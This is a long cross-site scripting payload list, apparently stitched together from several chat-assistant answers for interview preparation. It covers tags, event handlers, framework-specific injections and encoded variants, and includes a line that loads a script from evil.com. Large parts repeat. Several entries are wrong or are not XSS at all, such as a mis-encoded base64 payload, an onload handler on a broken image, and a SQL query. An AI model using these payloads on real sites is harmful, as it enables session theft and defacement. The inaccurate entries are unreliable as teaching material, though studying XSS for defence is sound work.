# XSS
XSS quick fire samples:

HTML/JavaScript

1. <script>alert('XSS')</script>


2. <img src=x onerror=alert('XSS')>


3. <svg><script>alert('XSS')</script></svg>


4. <iframe src="javascript:alert('XSS')"></iframe>


5. <body onload=alert('XSS')>



URL Parameters

1. http://example.com/?q=<script>alert('XSS')</script>


2. http://example.com/?q=<img src=x onerror=alert('XSS')>



JavaScript (JavaScript Events)

1. <a href="#" onclick="alert('XSS')">Click me</a>


2. <div onmouseover="alert('XSS')">Hover over me</div>



JSON

{"data": "<script>alert('XSS')</script>"}

XML

<data><![CDATA[<script>alert('XSS')</script>]]></data>

PHP (Common Injections)

1. <?php echo '<script>alert("XSS")</script>'; ?>


2. <?php echo $_GET['input']; ?>



ASP.NET

<%= "<script>alert('XSS')</script>" %>

Ruby on Rails (ERB)

<%= "<script>alert('XSS')</script>".html_safe %>

Python (Flask)

from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/<input>')
def index(input):
    return render_template_string(f"<script>alert('{input}')</script>")

Node.js (Express)

app.get('/input', (req, res) => {
    const input = req.query.input;
    res.send(`<script>alert('${input}')</script>`);
});

AngularJS

<div ng-bind="userInput"></div>
<script>
    var app = angular.module('myApp', []);
    app.controller('myCtrl', function($scope) {
        $scope.userInput = "<script>alert('XSS')</script>";
    });
</script>

Vue.js

<div v-html="userInput"></div>
<script>
    new Vue({
        el: '#app',
        data: {
            userInput: "<script>alert('XSS')</script>"
        }
    });
</script>

ASP Classic

<%
Response.Write "<script>alert('XSS')</script>"
%>

ColdFusion

<cfoutput>
    <script>alert('#form.input#')</script>
</cfoutput>

C# (ASP.NET MVC)

@Html.Raw("<script>alert('XSS')</script>")

Common Encodings

URL encoding: %3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E

HTML encoding: &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;


Special Cases

CSS injection: background-image: url("javascript:alert('XSS')")

JSONP: callbackFunction(<script>alert('XSS')</script>)

Here's a comprehensive list of XSS payloads for your preparation:

Basic XSS Payloads

1. <script>alert('XSS')</script>


2. <img src=x onerror=alert('XSS')>


3. <svg><script>alert('XSS')</script></svg>


4. <iframe src="javascript:alert('XSS')"></iframe>


5. <body onload=alert('XSS')>


6. <a href="#" onclick="alert('XSS')">Click me</a>


7. <div onmouseover="alert('XSS')">Hover over me</div>


8. <input type="text" value="<script>alert('XSS')</script>">



URL Parameter Attacks

1. http://example.com/?q=<script>alert('XSS')</script>


2. http://example.com/?q=<img src=x onerror=alert('XSS')>



HTML Injection in Different Contexts

1. JavaScript:

javascript:alert('XSS')



2. HTML Attribute:

<a href="javascript:alert('XSS')">Link</a>



3. CSS Injection:

style="background-image: url('javascript:alert(1)');"




Common Frameworks and Languages

1. PHP:

<?php echo '<script>alert("XSS")</script>'; ?>


2. ASP.NET:

<%= "<script>alert('XSS')</script>" %>


3. Ruby on Rails (ERB):

<%= "<script>alert('XSS')</script>".html_safe %>


4. Node.js (Express):

app.get('/input', (req, res) => {
    const input = req.query.input;
    res.send(`<script>alert('${input}')</script>`);
});


5. AngularJS:

<div ng-bind="userInput"></div>


6. Vue.js:

<div v-html="userInput"></div>



JSON/JavaScript Objects

1. JSON:

{"data": "<script>alert('XSS')</script>"}


2. JSONP: callbackFunction("<script>alert('XSS')</script>")



Encoded Payloads

1. URL-encoded: %3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E


2. HTML-encoded: &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;



Other Techniques

1. Meta Tags:

<meta http-equiv="refresh" content="0; url=javascript:alert('XSS');">


2. Form Action:

<form action="javascript:alert('XSS')">
    <input type="submit" value="Submit">
</form>


3. Base64 Encoded: data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFBTJyk8L3NjcmlwdD4=



CSS Injection Payloads

1. background-image: url("javascript:alert('XSS')")


2. content: url("javascript:alert('XSS')")



Special Cases

1. PDF:

Embedded JavaScript in PDF files.



2. SVG:

<svg><script>alert('XSS')</script></svg>



General Notes

Test each payload contextually; not all payloads will work in every environment.

Ensure you have permission to test any system before attempting any of these payloads.

Understand the context in which each payload is executed (HTML, attribute, JavaScript, etc.).


Good luck with your interview preparation!


Here’s a continuation with more advanced XSS techniques and payloads:

Advanced XSS Techniques

1. DOM-Based XSS

Exploiting URL Hash:

window.location.hash = "#<script>alert('XSS')</script>";

Using document.write:

<script>document.write('<script>alert("XSS")<\/script>');</script>


2. Event Handler Injection

Using onload in Images:

<img src="invalid.jpg" onload="alert('XSS')">

Mouse Event Manipulation:

<div onmouseover="alert('XSS')" style="height:100px; width:100px; background-color:red;"></div>


3. Contextual XSS

Inline Event Handlers:

<button onclick="alert('XSS')">Click Me</button>

Data Attributes:

<div data-info="<script>alert('XSS')</script>"></div>


4. JSON-Based Attacks

Exploiting JavaScript Deserialization:

{"callback": "alert('XSS')"}

Dynamic Script Loading:

var script = document.createElement('script');
script.src = "data:text/javascript,alert('XSS')";
document.body.appendChild(script);


5. Polyglot Payloads

Combining Contexts:

<svg><g/onload="alert('XSS')"></g></svg>

Using iframe for Escape:

<iframe src="javascript:alert('XSS')"></iframe>


6. SVG Injection

Embedded JavaScript:

<svg xmlns="http://www.w3.org/2000/svg"><script>alert('XSS')</script></svg>

Using feImage for External Resources:

<svg><image href="data:image/svg+xml,<svg><script>alert('XSS')</script></svg>"/></svg>


7. CSS-Related XSS

CSS Keyframes:

@keyframes x { 0% {background: red;} 100% {background: url("javascript:alert('XSS')")}}

Using url in CSS:

background-image: url("javascript:alert('XSS')");


8. Exploiting Frameworks

React (Unescaped HTML):

const userInput = "<script>alert('XSS')</script>";
return <div dangerouslySetInnerHTML={{ __html: userInput }} />;

Angular (Bypassing Security):

import { DomSanitizer } from '@angular/platform-browser';
const sanitizedHtml = this.sanitizer.bypassSecurityTrustHtml("<script>alert('XSS')</script>");


9. Server-Side Injection

HTTP Response Splitting:

Sending a header with newline characters to inject scripts.


Cookie Injection:

If cookies are read and output without sanitization:


document.cookie = "mycookie=<script>alert('XSS')</script>";


10. AJAX and XHR Exploits

Loading External Scripts:

var script = document.createElement('script');
script.src = 'http://evil.com/malicious.js';
document.body.appendChild(script);

XSS with JSONP:

<script src="http://example.com/callback?data=<script>alert('XSS')</script>"></script>


Additional Payloads and Scenarios

11. Testing With Special Characters

Using Special Characters:

<script>document.body.innerHTML += '<img src=x onerror=alert("XSS")>'; </script>


12. Exploiting XML and SOAP

XML Injection:

<request><param><script>alert('XSS')</script></param></request>

SOAP Payload:

<Envelope><Body><script>alert('XSS')</script></Body></Envelope>


13. Using HTML5 Features

WebSockets:

new WebSocket('ws://evil.com?payload=<script>alert("XSS")</script>');

Web Workers:

const worker = new Worker('data:text/javascript,alert("XSS")');


Key Points to Remember

Always test in safe, authorized environments.

Each technique may require different contexts for execution.

Be aware of Content Security Policy (CSP) restrictions that may affect payload execution.

Understanding the application structure is key to finding viable injection points.


Continue to refine your understanding of XSS vectors and stay updated on the latest techniques!

Here’s a further expansion on advanced XSS techniques and payloads:

Advanced XSS Techniques (Continued)

14. Exploiting the document Object

Using document.write with Dynamic Content:

<script>var userInput = "<script>alert('XSS')</script>"; document.write(userInput);</script>

Manipulating document.createElement:

var script = document.createElement('script');
script.text = "alert('XSS')";
document.body.appendChild(script);


15. Cross-Domain Techniques

Using window.opener:

In a pop-up, access the parent window.


window.opener.alert('XSS');

Exploiting CORS Misconfigurations:

Sending malicious requests from an untrusted domain.



16. Exploiting Web APIs

Fetch API with Malicious Input:

fetch('http://example.com/api?param=<script>alert("XSS")</script>');

Using WebSockets:

var ws = new WebSocket('ws://example.com/socket');
ws.onmessage = function(event) { eval(event.data); };


17. Template Injection

Exploiting Templating Engines:

If the application uses a templating engine that evaluates unescaped input:


{{ "<script>alert('XSS')</script>" }}


18. Exploiting Dynamic Rendering

Using JavaScript Variables:

var userInput = "<script>alert('XSS')</script>";
eval(userInput);


19. Local Storage and Session Storage

Storing Malicious Payload:

localStorage.setItem('key', "<script>alert('XSS')</script>");

Retrieving and Executing:

var payload = localStorage.getItem('key');
eval(payload);


20. CSS Tricks

Using CSS @import:

@import 'data:text/css,body{background:url("javascript:alert(1)")}';

Keyframe Animations:

@keyframes x { 0% { background: url("javascript:alert('XSS')") } }


Context-Specific Payloads

21. HTML Comments

Using Comments to Bypass Filters:

<script><!--alert('XSS')--></script>


22. Exploiting srcdoc Attribute in iframe

Injecting Scripts via srcdoc:

<iframe srcdoc="<script>alert('XSS')</script>"></iframe>


23. Audio and Video Tags

Using onerror in Media Elements:

<audio src="invalid.mp3" onerror="alert('XSS')"></audio>


24. Flash and Other Plugins

Flash Payloads:

<object data="data:application/x-shockwave-flash,<script>alert('XSS')</script>"></object>


25. QR Codes and Links

Generating QR Codes with Payloads:

Encode URLs leading to malicious scripts.



26. WordPress and CMS Exploits

Using Shortcodes:

[xss]<script>alert('XSS')</script>[/xss]

Theme and Plugin Vulnerabilities:

Injecting payloads into fields that do not sanitize input.



27. Advanced Browser Features

Service Workers:

Registering a service worker that intercepts requests and injects scripts.



28. Data URIs

Using Data URIs for XSS:

<img src="data:image/png;base64,iVBORw0KGg...<script>alert('XSS')</script>">


29. Exploiting Framework Limitations

Vue.js (v-html):

<div v-html="userInput"></div>

Angular (ng-bind):

<div ng-bind="userInput"></div>


30. Using Unvalidated Input

Reflected XSS through URL Parameters:

Accessing user input directly from the query string without sanitization.



31. Advanced HTTP Header Manipulation

Custom Headers with Malicious Payload:

X-Custom-Header: <script>alert('XSS')</script>


32. Contextual JavaScript

Using JavaScript's Function Constructor:

var payload = "alert('XSS')";
var func = new Function(payload);
func();


33. Using setTimeout and setInterval

Delaying Execution:

setTimeout("alert('XSS')", 1000);
setInterval("alert('XSS')", 1000);


Final Thoughts

Continuously explore new XSS vectors, as web technologies evolve.

Keep up with the latest vulnerabilities and patches in frameworks.

Always test responsibly, ensuring you have permission and use a safe environment.


Feel free to ask for more specific scenarios or deeper explanations on any topic!

Here's an extended list of advanced XS payloads, including various languages, functions, and hexadecimal payloads.

34. Hexadecimal Payloads

Basic Hexadecimal Encoding:

<script>alert(String.fromCharCode(88, 83, 83))</script>

Full Payload in Hex:

<script>alert('XSS')</script> encoded in hex:
%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E


35. Various Languages and Frameworks

Java

Using JSP:

<%= "<script>alert('XSS')</script>" %>


ASP.NET MVC

Razor View Injection:

@Html.Raw("<script>alert('XSS')</script>")


Django

Template Injection:

{{ "<script>alert('XSS')</script>"|safe }}


Flask (Python)

Flask Template Rendering:

return render_template_string('<script>alert("XSS")</script>')


PHP (Using eval)

Dynamic Code Execution:

eval('?> <script>alert("XSS")</script> <?php');


Node.js (Template Strings)

Dynamic Injection:

const userInput = "<script>alert('XSS')</script>";
res.send(`<html><body>${userInput}</body></html>`);


36. Using Unicode and Character Encoding

Unicode Characters:

<script>document.body.innerHTML += '\u003Cscript\u003Ealert(\u0027XSS\u0027)\u003C/script\u003E';</script>


37. Exploiting Object Prototypes

Modifying Prototypes:

Object.prototype.toString = function() { alert('XSS'); };


38. Payloads in WebSocket Messages

Sending Malicious Payloads:

var ws = new WebSocket('ws://example.com');
ws.onmessage = function(event) { eval(event.data); };
ws.send("<script>alert('XSS')</script>");


39. Advanced CSS Injection

CSS Filters:

filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='javascript:alert("XSS")', sizingMethod='scale');


40. Using Base64 Encoding

Base64 Encoded Payload:

<script src="data:text/javascript;base64,YWxlcnQoJ1hTUycpOw=="></script>


41. Function Overriding

Overriding alert Function:

window.alert = function() { console.log('XSS'); };
alert('XSS');


42. Testing XSS in Local Storage

Storing XSS in Local Storage:

localStorage.setItem('xss', "<script>alert('XSS')</script>");
var xssPayload = localStorage.getItem('xss');
eval(xssPayload);


43. Exploiting Malicious Forms

Form Submission with Payload:

<form action="http://example.com" method="post">
    <input type="text" name="data" value="<script>alert('XSS')</script>">
    <input type="submit">
</form>


44. Using XSS in SQL Injection

Combining SQL and XSS:

SELECT * FROM users WHERE name = '<script>alert("XSS")</script>';


45. Leveraging HTML5 Features

Using the sandbox Attribute:

<iframe src="javascript:alert('XSS');" sandbox="allow-same-origin"></iframe>


46. Event Listeners

Adding Event Listeners Dynamically:

document.addEventListener('click', function() {
    alert('XSS');
});


47. Using Custom JavaScript Functions

Custom Function for XSS:

function executeXSS() {
    alert('XSS');
}
executeXSS();


48. Encapsulated Scripts

Using Template Literals:

const xss = `<script>alert('XSS')</script>`;
document.body.innerHTML += xss;


49. Exploiting Insecure Deserialization

Crafted Object Injection:

const payload = {
    __proto__: { alert: function() { alert('XSS'); } }
};
console.log(payload);


50. Advanced Event Manipulation

Using onmessage:

window.onmessage = function(event) {
    eval(event.data);
};


51. Combining Multiple Techniques

Combining setTimeout and eval:

setTimeout("eval('<script>alert(1)</script>')", 1000);


52. Using Fragments in URLs

Fragment Identifier:

http://example.com/#<script>alert('XSS')</script>


53. Exploiting Insecure Headers

Custom HTTP Headers:

X-Custom-Header: <script>alert('XSS')</script>


Conclusion

Keep testing in various contexts, as different web technologies can change how XSS payloads behave.

Understanding how input is handled in different languages and frameworks can lead to discovering new vectors.

Always practice ethical hacking and ensure you have permission to test the systems.


Feel free to ask for further exploration into specific areas or techniques!






